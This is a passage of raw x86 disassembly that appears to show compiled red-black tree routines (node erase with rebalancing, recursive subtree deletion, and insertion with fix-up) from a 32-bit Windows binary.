   14f60:	push   ecx
   14f61:	push   ebx
   14f62:	push   esi
   14f63:	mov    DWORD PTR [ebp-0x4],ecx
   14f66:	push   edi
   14f67:	mov    edi,DWORD PTR [ebp+0xc]
   14f6a:	lea    ecx,[ebp+0xc]
   14f6d:	call   0x12ed2
   14f72:	mov    esi,DWORD PTR [edi]
   14f74:	mov    eax,ds:0x7f8c0
   14f79:	mov    ebx,edi
   14f7b:	mov    DWORD PTR [ebp-0x8],esi
   14f7e:	cmp    esi,eax
   14f80:	jne    0x14f9e
   14f82:	mov    esi,DWORD PTR [edi+0x8]
   14f85:	mov    eax,DWORD PTR [ebx+0x4]
   14f88:	mov    ecx,DWORD PTR [ebp-0x4]
   14f8b:	mov    DWORD PTR [esi+0x4],eax
   14f8e:	mov    eax,DWORD PTR [ecx+0x4]
   14f91:	cmp    DWORD PTR [eax+0x4],edi
   14f94:	jne    0x15013
   14f96:	mov    DWORD PTR [eax+0x4],esi
   14f99:	jmp    0x15021
   14f9e:	mov    ecx,DWORD PTR [edi+0x8]
   14fa1:	cmp    ecx,eax
   14fa3:	je     0x14f85
   14fa5:	push   ecx
   14fa6:	call   0x11272
   14fab:	mov    ebx,eax
   14fad:	mov    esi,DWORD PTR [ebx+0x8]
   14fb0:	cmp    ebx,edi
   14fb2:	je     0x14f85
   14fb4:	mov    eax,DWORD PTR [ebp-0x8]
   14fb7:	mov    DWORD PTR [eax+0x4],ebx
   14fba:	mov    eax,DWORD PTR [edi]
   14fbc:	mov    DWORD PTR [ebx],eax
   14fbe:	cmp    ebx,DWORD PTR [edi+0x8]
   14fc1:	jne    0x14fc8
   14fc3:	mov    DWORD PTR [esi+0x4],ebx
   14fc6:	jmp    0x14fdf
   14fc8:	mov    eax,DWORD PTR [ebx+0x4]
   14fcb:	mov    DWORD PTR [esi+0x4],eax
   14fce:	mov    eax,DWORD PTR [ebx+0x4]
   14fd1:	mov    DWORD PTR [eax],esi
   14fd3:	mov    eax,DWORD PTR [edi+0x8]
   14fd6:	mov    DWORD PTR [ebx+0x8],eax
   14fd9:	mov    eax,DWORD PTR [edi+0x8]
   14fdc:	mov    DWORD PTR [eax+0x4],ebx
   14fdf:	mov    eax,DWORD PTR [ebp-0x4]
   14fe2:	mov    eax,DWORD PTR [eax+0x4]
   14fe5:	cmp    DWORD PTR [eax+0x4],edi
   14fe8:	jne    0x14fef
   14fea:	mov    DWORD PTR [eax+0x4],ebx
   14fed:	jmp    0x14ffd
   14fef:	mov    eax,DWORD PTR [edi+0x4]
   14ff2:	cmp    DWORD PTR [eax],edi
   14ff4:	jne    0x14ffa
   14ff6:	mov    DWORD PTR [eax],ebx
   14ff8:	jmp    0x14ffd
   14ffa:	mov    DWORD PTR [eax+0x8],ebx
   14ffd:	mov    eax,DWORD PTR [edi+0x4]
   15000:	mov    DWORD PTR [ebx+0x4],eax
   15003:	mov    eax,DWORD PTR [ebx+0x70]
   15006:	mov    ecx,DWORD PTR [edi+0x70]
   15009:	mov    DWORD PTR [ebx+0x70],ecx
   1500c:	mov    DWORD PTR [edi+0x70],eax
   1500f:	mov    ebx,edi
   15011:	jmp    0x15074
   15013:	mov    eax,DWORD PTR [edi+0x4]
   15016:	cmp    DWORD PTR [eax],edi
   15018:	jne    0x1501e
   1501a:	mov    DWORD PTR [eax],esi
   1501c:	jmp    0x15021
   1501e:	mov    DWORD PTR [eax+0x8],esi
   15021:	mov    eax,DWORD PTR [ecx+0x4]
   15024:	mov    DWORD PTR [ebp-0x8],eax
   15027:	cmp    DWORD PTR [eax],edi
   15029:	jne    0x1504b
   1502b:	mov    edx,DWORD PTR [edi+0x8]
   1502e:	cmp    edx,DWORD PTR ds:0x7f8c0
   15034:	jne    0x1503d
   15036:	mov    edx,DWORD PTR [edi+0x4]
   15039:	mov    DWORD PTR [eax],edx
   1503b:	jmp    0x1504b
   1503d:	push   esi
   1503e:	call   0x11272
   15043:	mov    ecx,DWORD PTR [ebp-0x8]
   15046:	mov    DWORD PTR [ecx],eax
   15048:	mov    ecx,DWORD PTR [ebp-0x4]
   1504b:	mov    eax,DWORD PTR [ecx+0x4]
   1504e:	mov    DWORD PTR [ebp-0x8],eax
   15051:	cmp    DWORD PTR [eax+0x8],edi
   15054:	jne    0x15074
   15056:	mov    ecx,DWORD PTR [edi]
   15058:	cmp    ecx,DWORD PTR ds:0x7f8c0
   1505e:	jne    0x15068
   15060:	mov    ecx,DWORD PTR [edi+0x4]
   15063:	mov    DWORD PTR [eax+0x8],ecx
   15066:	jmp    0x15074
   15068:	push   esi
   15069:	call   0x11250
   1506e:	mov    ecx,DWORD PTR [ebp-0x8]
   15071:	mov    DWORD PTR [ecx+0x8],eax
   15074:	xor    edi,edi
   15076:	inc    edi
   15077:	cmp    DWORD PTR [ebx+0x70],edi
   1507a:	jne    0x15191
   15080:	jmp    0x1513f
   15085:	cmp    DWORD PTR [esi+0x70],edi
   15088:	jne    0x1518e
   1508e:	mov    eax,DWORD PTR [esi+0x4]
   15091:	cmp    esi,DWORD PTR [eax]
   15093:	jne    0x1510a
   15095:	mov    eax,DWORD PTR [eax+0x8]
   15098:	cmp    DWORD PTR [eax+0x70],0x0
   1509c:	jne    0x150b6
   1509e:	mov    DWORD PTR [eax+0x70],edi
   150a1:	mov    eax,DWORD PTR [esi+0x4]
   150a4:	and    DWORD PTR [eax+0x70],0x0
   150a8:	push   DWORD PTR [esi+0x4]
   150ab:	call   0x1305c
   150b0:	mov    eax,DWORD PTR [esi+0x4]
   150b3:	mov    eax,DWORD PTR [eax+0x8]
   150b6:	mov    ecx,DWORD PTR [eax]
   150b8:	cmp    DWORD PTR [ecx+0x70],edi
   150bb:	jne    0x150c5
   150bd:	mov    ecx,DWORD PTR [eax+0x8]
   150c0:	cmp    DWORD PTR [ecx+0x70],edi
   150c3:	je     0x15138
   150c5:	mov    ecx,DWORD PTR [eax+0x8]
   150c8:	cmp    DWORD PTR [ecx+0x70],edi
   150cb:	jne    0x150e5
   150cd:	mov    ecx,DWORD PTR [eax]
   150cf:	mov    DWORD PTR [ecx+0x70],edi
   150d2:	mov    ecx,DWORD PTR [ebp-0x4]
   150d5:	and    DWORD PTR [eax+0x70],0x0
   150d9:	push   eax
   150da:	call   0x130aa
   150df:	mov    eax,DWORD PTR [esi+0x4]
   150e2:	mov    eax,DWORD PTR [eax+0x8]
   150e5:	mov    ecx,DWORD PTR [esi+0x4]
   150e8:	mov    ecx,DWORD PTR [ecx+0x70]
   150eb:	mov    DWORD PTR [eax+0x70],ecx
   150ee:	mov    ecx,DWORD PTR [esi+0x4]
   150f1:	mov    DWORD PTR [ecx+0x70],edi
   150f4:	mov    eax,DWORD PTR [eax+0x8]
   150f7:	mov    ecx,DWORD PTR [ebp-0x4]
   150fa:	mov    DWORD PTR [eax+0x70],edi
   150fd:	push   DWORD PTR [esi+0x4]
   15100:	call   0x1305c
   15105:	jmp    0x1518e
   1510a:	mov    eax,DWORD PTR [eax]
   1510c:	cmp    DWORD PTR [eax+0x70],0x0
   15110:	jne    0x15129
   15112:	mov    DWORD PTR [eax+0x70],edi
   15115:	mov    eax,DWORD PTR [esi+0x4]
   15118:	and    DWORD PTR [eax+0x70],0x0
   1511c:	push   DWORD PTR [esi+0x4]
   1511f:	call   0x130aa
   15124:	mov    eax,DWORD PTR [esi+0x4]
   15127:	mov    eax,DWORD PTR [eax]
   15129:	mov    ecx,DWORD PTR [eax+0x8]
   1512c:	cmp    DWORD PTR [ecx+0x70],edi
   1512f:	jne    0x15150
   15131:	mov    ecx,DWORD PTR [eax]
   15133:	cmp    DWORD PTR [ecx+0x70],edi
   15136:	jne    0x15150
   15138:	and    DWORD PTR [eax+0x70],0x0
   1513c:	mov    esi,DWORD PTR [esi+0x4]
   1513f:	mov    ecx,DWORD PTR [ebp-0x4]
   15142:	mov    eax,DWORD PTR [ecx+0x4]
   15145:	cmp    esi,DWORD PTR [eax+0x4]
   15148:	jne    0x15085
   1514e:	jmp    0x1518e
   15150:	mov    ecx,DWORD PTR [eax]
   15152:	cmp    DWORD PTR [ecx+0x70],edi
   15155:	jne    0x1516f
   15157:	mov    ecx,DWORD PTR [eax+0x8]
   1515a:	mov    DWORD PTR [ecx+0x70],edi
   1515d:	mov    ecx,DWORD PTR [ebp-0x4]
   15160:	and    DWORD PTR [eax+0x70],0x0
   15164:	push   eax
   15165:	call   0x1305c
   1516a:	mov    eax,DWORD PTR [esi+0x4]
   1516d:	mov    eax,DWORD PTR [eax]
   1516f:	mov    ecx,DWORD PTR [esi+0x4]
   15172:	mov    ecx,DWORD PTR [ecx+0x70]
   15175:	mov    DWORD PTR [eax+0x70],ecx
   15178:	mov    ecx,DWORD PTR [esi+0x4]
   1517b:	mov    DWORD PTR [ecx+0x70],edi
   1517e:	mov    eax,DWORD PTR [eax]
   15180:	mov    ecx,DWORD PTR [ebp-0x4]
   15183:	mov    DWORD PTR [eax+0x70],edi
   15186:	push   DWORD PTR [esi+0x4]
   15189:	call   0x130aa
   1518e:	mov    DWORD PTR [esi+0x70],edi
   15191:	lea    eax,[ebx+0x10]
   15194:	push   eax
   15195:	call   0x13af4
   1519a:	push   ebx
   1519b:	call   0x10a86
   151a0:	mov    eax,DWORD PTR [ebp-0x4]
   151a3:	dec    DWORD PTR [eax+0xc]
   151a6:	mov    eax,DWORD PTR [ebp+0x8]
   151a9:	pop    ecx
   151aa:	mov    ecx,DWORD PTR [ebp+0xc]
   151ad:	pop    edi
   151ae:	pop    esi
   151af:	mov    DWORD PTR [eax],ecx
   151b1:	pop    ebx
   151b2:	leave  
   151b3:	ret    0x8
   151b6:	int3   
   151b7:	int3   
   151b8:	int3   
   151b9:	int3   
   151ba:	int3   
   151bb:	int3   
   151bc:	mov    edi,edi
   151be:	push   ebp
   151bf:	mov    ebp,esp
   151c1:	push   ebx
   151c2:	push   esi
   151c3:	push   edi
   151c4:	mov    edi,DWORD PTR [ebp+0x8]
   151c7:	mov    ebx,ecx
   151c9:	mov    esi,edi
   151cb:	cmp    edi,DWORD PTR ds:0x7f8c0
   151d1:	je     0x151f9
   151d3:	push   DWORD PTR [esi+0x8]
   151d6:	mov    ecx,ebx
   151d8:	call   0x151bc
   151dd:	mov    esi,DWORD PTR [esi]
   151df:	lea    eax,[edi+0x10]
   151e2:	push   eax
   151e3:	call   0x13af4
   151e8:	push   edi
   151e9:	call   0x10a86
   151ee:	pop    ecx
   151ef:	mov    edi,esi
   151f1:	cmp    esi,DWORD PTR ds:0x7f8c0
   151f7:	jne    0x151d3
   151f9:	pop    edi
   151fa:	pop    esi
   151fb:	pop    ebx
   151fc:	pop    ebp
   151fd:	ret    0x4
   15200:	int3   
   15201:	int3   
   15202:	int3   
   15203:	int3   
   15204:	int3   
   15205:	int3   
   15206:	mov    edi,edi
   15208:	push   ebp
   15209:	mov    ebp,esp
   1520b:	push   ebx
   1520c:	push   esi
   1520d:	mov    esi,DWORD PTR [ebp+0x10]
   15210:	push   edi
   15211:	push   0x0
   15213:	push   esi
   15214:	mov    edi,ecx
   15216:	call   0x139da
   1521b:	push   DWORD PTR [ebp+0x14]
   1521e:	mov    ebx,eax
   15220:	mov    eax,ds:0x7f8c0
   15225:	mov    DWORD PTR [ebx],eax
   15227:	mov    eax,ds:0x7f8c0
   1522c:	mov    DWORD PTR [ebx+0x8],eax
   1522f:	lea    eax,[ebx+0x10]
   15232:	push   eax
   15233:	call   0x13ad6
   15238:	inc    DWORD PTR [edi+0xc]
   1523b:	cmp    esi,DWORD PTR [edi+0x4]
   1523e:	je     0x15268
   15240:	mov    eax,DWORD PTR [ebp+0xc]
   15243:	cmp    eax,DWORD PTR ds:0x7f8c0
   15249:	jne    0x15268
   1524b:	lea    eax,[esi+0x10]
   1524e:	push   eax
   1524f:	push   DWORD PTR [ebp+0x14]
   15252:	call   0x197f4
   15257:	test   al,al
   15259:	jne    0x15268
   1525b:	mov    DWORD PTR [esi+0x8],ebx
   1525e:	mov    eax,DWORD PTR [edi+0x4]
   15261:	cmp    esi,DWORD PTR [eax+0x8]
   15264:	jne    0x15282
   15266:	jmp    0x15277
   15268:	mov    DWORD PTR [esi],ebx
   1526a:	mov    eax,DWORD PTR [edi+0x4]
   1526d:	cmp    esi,eax
   1526f:	jne    0x1527c
   15271:	mov    DWORD PTR [eax+0x4],ebx
   15274:	mov    eax,DWORD PTR [edi+0x4]
   15277:	mov    DWORD PTR [eax+0x8],ebx
   1527a:	jmp    0x15282
   1527c:	cmp    esi,DWORD PTR [eax]
   1527e:	jne    0x15282
   15280:	mov    DWORD PTR [eax],ebx
   15282:	mov    eax,DWORD PTR [edi+0x4]
   15285:	mov    esi,ebx
   15287:	cmp    ebx,DWORD PTR [eax+0x4]
   1528a:	je     0x1533e
   15290:	mov    eax,DWORD PTR [esi+0x4]
   15293:	xor    edx,edx
   15295:	cmp    DWORD PTR [eax+0x70],edx
   15298:	jne    0x1533e
   1529e:	mov    ecx,DWORD PTR [eax+0x4]
   152a1:	cmp    eax,DWORD PTR [ecx]
   152a3:	jne    0x152df
   152a5:	mov    ecx,DWORD PTR [ecx+0x8]
   152a8:	cmp    DWORD PTR [ecx+0x70],edx
   152ab:	je     0x152e6
   152ad:	cmp    esi,DWORD PTR [eax+0x8]
   152b0:	jne    0x152bc
   152b2:	mov    esi,eax
   152b4:	push   esi
   152b5:	mov    ecx,edi
   152b7:	call   0x1305c
   152bc:	mov    eax,DWORD PTR [esi+0x4]
   152bf:	mov    DWORD PTR [eax+0x70],0x1
   152c6:	mov    eax,DWORD PTR [esi+0x4]
   152c9:	mov    eax,DWORD PTR [eax+0x4]
   152cc:	and    DWORD PTR [eax+0x70],0x0
   152d0:	mov    eax,DWORD PTR [esi+0x4]
   152d3:	push   DWORD PTR [eax+0x4]
   152d6:	mov    ecx,edi
   152d8:	call   0x130aa
   152dd:	jmp    0x15332
   152df:	mov    ecx,DWORD PTR [ecx]
   152e1:	cmp    DWORD PTR [ecx+0x70],edx
   152e4:	jne    0x15303
   152e6:	mov    edx,eax
   152e8:	xor    eax,eax
   152ea:	inc    eax
   152eb:	mov    DWORD PTR [edx+0x70],eax
   152ee:	mov    DWORD PTR [ecx+0x70],eax
   152f1:	mov    eax,DWORD PTR [esi+0x4]
   152f4:	mov    eax,DWORD PTR [eax+0x4]
   152f7:	and    DWORD PTR [eax+0x70],0x0
   152fb:	mov    eax,DWORD PTR [esi+0x4]
   152fe:	mov    esi,DWORD PTR [eax+0x4]
   15301:	jmp    0x15332
   15303:	cmp    esi,DWORD PTR [eax]
   15305:	jne    0x15311
   15307:	mov    esi,eax
   15309:	push   esi
   1530a:	mov    ecx,edi
   1530c:	call   0x130aa
   15311:	mov    eax,DWORD PTR [esi+0x4]
   15314:	mov    DWORD PTR [eax+0x70],0x1
   1531b:	mov    eax,DWORD PTR [esi+0x4]
   1531e:	mov    eax,DWORD PTR [eax+0x4]
   15321:	and    DWORD PTR [eax+0x70],0x0
   15325:	mov    eax,DWORD PTR [esi+0x4]
   15328:	push   DWORD PTR [eax+0x4]
   1532b:	mov    ecx,edi
   1532d:	call   0x1305c
   15332:	mov    eax,DWORD PTR [edi+0x4]
   15335:	cmp    esi,DWORD PTR [eax+0x4]
   15338:	jne    0x15290
   1533e:	mov    eax,DWORD PTR [edi+0x4]
   15341:	mov    eax,DWORD PTR [eax+0x4]
   15344:	pop    edi
   15345:	mov    DWORD PTR [eax+0x70],0x1
   1534c:	mov    eax,DWORD PTR [ebp+0x8]
   1534f:	pop    esi
   15350:	mov    DWORD PTR [eax],ebx
   15352:	pop    ebx
   15353:	pop    ebp
   15354:	ret    0x10
   15357:	int3   
   15358:	int3   
   15359:	int3   
   1535a:	int3   
   1535b:	int3   
   1535c:	mov    edi,edi
   1535e:	push   ebp
   1535f:	mov    ebp,esp
   15361:	push   ecx
   15362:	push   ecx
   15363:	push   ebx
   15364:	push   esi
   15365:	mov    DWORD PTR [ebp-0x4],ecx
   15368:	push   edi
   15369:	mov    edi,DWORD PTR [ebp+0xc]
   1536c:	lea    ecx,[ebp+0xc]
   1536f:	call   0x13890
   15374:	mov    esi,DWORD PTR [edi]
   15376:	mov    eax,ds:0x7f8c4
   1537b:	mov    ebx,edi
   1537d:	mov    DWORD PTR [ebp-0x8],esi
   15380:	cmp    esi,eax
   15382:	jne    0x153a0
   15384:	mov    esi,DWORD PTR [edi+0x8]
   15387:	mov    eax,DWORD PTR [ebx+0x4]
   1538a:	mov    ecx,DWORD PTR [ebp-0x4]
   1538d:	mov    DWORD PTR [esi+0x4],eax
   15390:	mov    eax,DWORD PTR [ecx+0x4]
   15393:	cmp    DWORD PTR [eax+0x4],edi
   15396:	jne    0x15415
   15398:	mov    DWORD PTR [eax+0x4],esi
   1539b:	jmp    0x15423
   153a0:	mov    ecx,DWORD PTR [edi+0x8]
   153a3:	cmp    ecx,eax
   153a5:	je     0x15387
   153a7:	push   ecx
   153a8:	call   0x12cfa
   153ad:	mov    ebx,eax
   153af:	mov    esi,DWORD PTR [ebx+0x8]
   153b2:	cmp    ebx,edi
   153b4:	je     0x15387
   153b6:	mov    eax,DWORD PTR [ebp-0x8]
   153b9:	mov    DWORD PTR [eax+0x4],ebx
   153bc:	mov    eax,DWORD PTR [edi]
   153be:	mov    DWORD PTR [ebx],eax
   153c0:	cmp    ebx,DWORD PTR [edi+0x8]
   153c3:	jne    0x153ca
   153c5:	mov    DWORD PTR [esi+0x4],ebx
   153c8:	jmp    0x153e1
   153ca:	mov    eax,DWORD PTR [ebx+0x4]
   153cd:	mov    DWORD PTR [esi+0x4],eax
   153d0:	mov    eax,DWORD PTR [ebx+0x4]
   153d3:	mov    DWORD PTR [eax],esi
   153d5:	mov    eax,DWORD PTR [edi+0x8]
   153d8:	mov    DWORD PTR [ebx+0x8],eax
   153db:	mov    eax,DWORD PTR [edi+0x8]
   153de:	mov    DWORD PTR [eax+0x4],ebx
   153e1:	mov    eax,DWORD PTR [ebp-0x4]
   153e4:	mov    eax,DWORD PTR [eax+0x4]
   153e7:	cmp    DWORD PTR [eax+0x4],edi
   153ea:	jne    0x153f1
   153ec:	mov    DWORD PTR [eax+0x4],ebx
   153ef:	jmp    0x153ff
   153f1:	mov    eax,DWORD PTR [edi+0x4]
   153f4:	cmp    DWORD PTR [eax],edi
   153f6:	jne    0x153fc
   153f8:	mov    DWORD PTR [eax],ebx
   153fa:	jmp    0x153ff
   153fc:	mov    DWORD PTR [eax+0x8],ebx
   153ff:	mov    eax,DWORD PTR [edi+0x4]
   15402:	mov    DWORD PTR [ebx+0x4],eax
   15405:	mov    eax,DWORD PTR [ebx+0x68]
   15408:	mov    ecx,DWORD PTR [edi+0x68]
   1540b:	mov    DWORD PTR [ebx+0x68],ecx
   1540e:	mov    DWORD PTR [edi+0x68],eax
   15411:	mov    ebx,edi
   15413:	jmp    0x15476
   15415:	mov    eax,DWORD PTR [edi+0x4]
   15418:	cmp    DWORD PTR [eax],edi
   1541a:	jne    0x15420
   1541c:	mov    DWORD PTR [eax],esi
   1541e:	jmp    0x15423
   15420:	mov    DWORD PTR [eax+0x8],esi
   15423:	mov    eax,DWORD PTR [ecx+0x4]
   15426:	mov    DWORD PTR [ebp-0x8],eax
   15429:	cmp    DWORD PTR [eax],edi
   1542b:	jne    0x1544d
   1542d:	mov    edx,DWORD PTR [edi+0x8]
   15430:	cmp    edx,DWORD PTR ds:0x7f8c4
   15436:	jne    0x1543f
   15438:	mov    edx,DWORD PTR [edi+0x4]
   1543b:	mov    DWORD PTR [eax],edx
   1543d:	jmp    0x1544d
   1543f:	push   esi
   15440:	call   0x12cfa
   15445:	mov    ecx,DWORD PTR [ebp-0x8]
   15448:	mov    DWORD PTR [ecx],eax
   1544a:	mov    ecx,DWORD PTR [ebp-0x4]
   1544d:	mov    eax,DWORD PTR [ecx+0x4]
   15450:	mov    DWORD PTR [ebp-0x8],eax
   15453:	cmp    DWORD PTR [eax+0x8],edi
   15456:	jne    0x15476
   15458:	mov    ecx,DWORD PTR [edi]
   1545a:	cmp    ecx,DWORD PTR ds:0x7f8c4
   15460:	jne    0x1546a
   15462:	mov    ecx,DWORD PTR [edi+0x4]
   15465:	mov    DWORD PTR [eax+0x8],ecx
   15468:	jmp    0x15476
   1546a:	push   esi
   1546b:	call   0x11358
   15470:	mov    ecx,DWORD PTR [ebp-0x8]
   15473:	mov    DWORD PTR [ecx+0x8],eax
   15476:	xor    edi,edi
   15478:	inc    edi
   15479:	cmp    DWORD PTR [ebx+0x68],edi
   1547c:	jne    0x15593
   15482:	jmp    0x15541
   15487:	cmp    DWORD PTR [esi+0x68],edi
   1548a:	jne    0x15590
   15490:	mov    eax,DWORD PTR [esi+0x4]
   15493:	cmp    esi,DWORD PTR [eax]
   15495:	jne    0x1550c
   15497:	mov    eax,DWORD PTR [eax+0x8]
   1549a:	cmp    DWORD PTR [eax+0x68],0x0
   1549e:	jne    0x154b8
   154a0:	mov    DWORD PTR [eax+0x68],edi
   154a3:	mov    eax,DWORD PTR [esi+0x4]
   154a6:	and    DWORD PTR [eax+0x68],0x0
   154aa:	push   DWORD PTR [esi+0x4]
   154ad:	call   0x1130a
   154b2:	mov    eax,DWORD PTR [esi+0x4]
   154b5:	mov    eax,DWORD PTR [eax+0x8]
   154b8:	mov    ecx,DWORD PTR [eax]
   154ba:	cmp    DWORD PTR [ecx+0x68],edi
   154bd:	jne    0x154c7
   154bf:	mov    ecx,DWORD PTR [eax+0x8]
   154c2:	cmp    DWORD PTR [ecx+0x68],edi
   154c5:	je     0x1553a
   154c7:	mov    ecx,DWORD PTR [eax+0x8]
   154ca:	cmp    DWORD PTR [ecx+0x68],edi
   154cd:	jne    0x154e7
   154cf:	mov    ecx,DWORD PTR [eax]
   154d1:	mov    DWORD PTR [ecx+0x68],edi
   154d4:	mov    ecx,DWORD PTR [ebp-0x4]
   154d7:	and    DWORD PTR [eax+0x68],0x0
   154db:	push   eax
   154dc:	call   0x1137a
   154e1:	mov    eax,DWORD PTR [esi+0x4]
   154e4:	mov    eax,DWORD PTR [eax+0x8]
   154e7:	mov    ecx,DWORD PTR [esi+0x4]
   154ea:	mov    ecx,DWORD PTR [ecx+0x68]
   154ed:	mov    DWORD PTR [eax+0x68],ecx
   154f0:	mov    ecx,DWORD PTR [esi+0x4]
   154f3:	mov    DWORD PTR [ecx+0x68],edi
   154f6:	mov    eax,DWORD PTR [eax+0x8]
   154f9:	mov    ecx,DWORD PTR [ebp-0x4]
   154fc:	mov    DWORD PTR [eax+0x68],edi
   154ff:	push   DWORD PTR [esi+0x4]
   15502:	call   0x1130a
   15507:	jmp    0x15590
   1550c:	mov    eax,DWORD PTR [eax]
   1550e:	cmp    DWORD PTR [eax+0x68],0x0
   15512:	jne    0x1552b
   15514:	mov    DWORD PTR [eax+0x68],edi
   15517:	mov    eax,DWORD PTR [esi+0x4]
   1551a:	and    DWORD PTR [eax+0x68],0x0
   1551e:	push   DWORD PTR [esi+0x4]
   15521:	call   0x1137a
   15526:	mov    eax,DWORD PTR [esi+0x4]
   15529:	mov    eax,DWORD PTR [eax]
   1552b:	mov    ecx,DWORD PTR [eax+0x8]
   1552e:	cmp    DWORD PTR [ecx+0x68],edi
   15531:	jne    0x15552
   15533:	mov    ecx,DWORD PTR [eax]
   15535:	cmp    DWORD PTR [ecx+0x68],edi
   15538:	jne    0x15552
   1553a:	and    DWORD PTR [eax+0x68],0x0
   1553e:	mov    esi,DWORD PTR [esi+0x4]
   15541:	mov    ecx,DWORD PTR [ebp-0x4]
   15544:	mov    eax,DWORD PTR [ecx+0x4]
   15547:	cmp    esi,DWORD PTR [eax+0x4]
   1554a:	jne    0x15487
   15550:	jmp    0x15590
   15552:	mov    ecx,DWORD PTR [eax]
   15554:	cmp    DWORD PTR [ecx+0x68],edi
   15557:	jne    0x15571
   15559:	mov    ecx,DWORD PTR [eax+0x8]
   1555c:	mov    DWORD PTR [ecx+0x68],edi
   1555f:	mov    ecx,DWORD PTR [ebp-0x4]
   15562:	and    DWORD PTR [eax+0x68],0x0
   15566:	push   eax
   15567:	call   0x1130a
   1556c:	mov    eax,DWORD PTR [esi+0x4]
   1556f:	mov    eax,DWORD PTR [eax]
   15571:	mov    ecx,DWORD PTR [esi+0x4]
   15574:	mov    ecx,DWORD PTR [ecx+0x68]
   15577:	mov    DWORD PTR [eax+0x68],ecx
   1557a:	mov    ecx,DWORD PTR [esi+0x4]
   1557d:	mov    DWORD PTR [ecx+0x68],edi
   15580:	mov    eax,DWORD PTR [eax]
   15582:	mov    ecx,DWORD PTR [ebp-0x4]
   15585:	mov    DWORD PTR [eax+0x68],edi
   15588:	push   DWORD PTR [esi+0x4]
   1558b:	call   0x1137a
   15590:	mov    DWORD PTR [esi+0x68],edi
   15593:	lea    eax,[ebx+0x10]
   15596:	push   eax
   15597:	call   0x13af4
   1559c:	push   ebx
   1559d:	call   0x10a86
   155a2:	mov    eax,DWORD PTR [ebp-0x4]
   155a5:	dec    DWORD PTR [eax+0xc]
   155a8:	mov    eax,DWORD PTR [ebp+0x8]
   155ab:	pop    ecx
   155ac:	mov    ecx,DWORD PTR [ebp+0xc]
   155af:	pop    edi
   155b0:	pop    esi
   155b1:	mov    DWORD PTR [eax],ecx
   155b3:	pop    ebx
   155b4:	leave  
   155b5:	ret    0x8
   155b8:	int3   
   155b9:	int3   
   155ba:	int3   
   155bb:	int3   
   155bc:	int3   
   155bd:	int3   
   155be:	mov    edi,edi
   155c0:	push   ebp
   155c1:	mov    ebp,esp
   155c3:	push   ebx
   155c4:	push   esi
   155c5:	push   edi
   155c6:	mov    edi,DWORD PTR [ebp+0x8]
   155c9:	mov    ebx,ecx
   155cb:	mov    esi,edi
   155cd:	cmp    edi,DWORD PTR ds:0x7f8c4
   155d3:	je     0x155fb
   155d5:	push   DWORD PTR [esi+0x8]
   155d8:	mov    ecx,ebx
   155da:	call   0x155be
   155df:	mov    esi,DWORD PTR [esi]
   155e1:	lea    eax,[edi+0x10]
   155e4:	push   eax
   155e5:	call   0x13af4
   155ea:	push   edi
   155eb:	call   0x10a86
   155f0:	pop    ecx
   155f1:	mov    edi,esi
   155f3:	cmp    esi,DWORD PTR ds:0x7f8c4
   155f9:	jne    0x155d5
   155fb:	pop    edi
   155fc:	pop    esi
   155fd:	pop    ebx
   155fe:	pop    ebp
   155ff:	ret    0x4
   15602:	int3   
   15603:	int3   
   15604:	int3   
   15605:	int3   
   15606:	int3   
   15607:	int3   
   15608:	mov    edi,edi
   1560a:	push   ebp
   1560b:	mov    ebp,esp
   1560d:	push   ebx
   1560e:	push   esi
   1560f:	mov    esi,DWORD PTR [ebp+0x10]
   15612:	push   edi
   15613:	push   0x0
   15615:	push   esi
   15616:	mov    edi,ecx
   15618:	call   0x13992
   1561d:	push   DWORD PTR [ebp+0x14]
   15620:	mov    ebx,eax
   15622:	mov    eax,ds:0x7f8c4
   15627:	mov    DWORD PTR [ebx],eax
   15629:	mov    eax,ds:0x7f8c4
   1562e:	mov    DWORD PTR [ebx+0x8],eax
   15631:	lea    eax,[ebx+0x10]
   15634:	push   eax
   15635:	call   0x13b0c
   1563a:	inc    DWORD PTR [edi+0xc]
   1563d:	cmp    esi,DWORD PTR [edi+0x4]
   15640:	je     0x1566a
   15642:	mov    eax,DWORD PTR [ebp+0xc]
   15645:	cmp    eax,DWORD PTR ds:0x7f8c4
   1564b:	jne    0x1566a
   1564d:	lea    eax,[esi+0x10]
   15650:	push   eax
   15651:	push   DWORD PTR [ebp+0x14]
   15654:	call   0x197f4
   15659:	test   al,al
   1565b:	jne    0x1566a
   1565d:	mov    DWORD PTR [esi+0x8],ebx
   15660:	mov    eax,DWORD PTR [edi+0x4]
   15663:	cmp    esi,DWORD PTR [eax+0x8]
   15666:	jne    0x15684
   15668:	jmp    0x15679
   1566a:	mov    DWORD PTR [esi],ebx
   1566c:	mov    eax,DWORD PTR [edi+0x4]
   1566f:	cmp    esi,eax
   15671:	jne    0x1567e
   15673:	mov    DWORD PTR [eax+0x4],ebx
   15676:	mov    eax,DWORD PTR [edi+0x4]
   15679:	mov    DWORD PTR [eax+0x8],ebx
   1567c:	jmp    0x15684
   1567e:	cmp    esi,DWORD PTR [eax]
   15680:	jne    0x15684
   15682:	mov    DWORD PTR [eax],ebx
   15684:	mov    eax,DWORD PTR [edi+0x4]
   15687:	mov    esi,ebx
   15689:	cmp    ebx,DWORD PTR [eax+0x4]
   1568c:	je     0x15740
   15692:	mov    eax,DWORD PTR [esi+0x4]
   15695:	xor    edx,edx
   15697:	cmp    DWORD PTR [eax+0x68],edx
   1569a:	jne    0x15740
   156a0:	mov    ecx,DWORD PTR [eax+0x4]
   156a3:	cmp    eax,DWORD PTR [ecx]
   156a5:	jne    0x156e1
   156a7:	mov    ecx,DWORD PTR [ecx+0x8]
   156aa:	cmp    DWORD PTR [ecx+0x68],edx
   156ad:	je     0x156e8
   156af:	cmp    esi,DWORD PTR [eax+0x8]
   156b2:	jne    0x156be
   156b4:	mov    esi,eax
   156b6:	push   esi
   156b7:	mov    ecx,edi
   156b9:	call   0x1130a
   156be:	mov    eax,DWORD PTR [esi+0x4]
   156c1:	mov    DWORD PTR [eax+0x68],0x1
   156c8:	mov    eax,DWORD PTR [esi+0x4]
   156cb:	mov    eax,DWORD PTR [eax+0x4]
   156ce:	and    DWORD PTR [eax+0x68],0x0
   156d2:	mov    eax,DWORD PTR [esi+0x4]
   156d5:	push   DWORD PTR [eax+0x4]
   156d8:	mov    ecx,edi
   156da:	call   0x1137a
   156df:	jmp    0x15734
   156e1:	mov    ecx,DWORD PTR [ecx]
   156e3:	cmp    DWORD PTR [ecx+0x68],edx
   156e6:	jne    0x15705
   156e8:	mov    edx,eax
   156ea:	xor    eax,eax
   156ec:	inc    eax
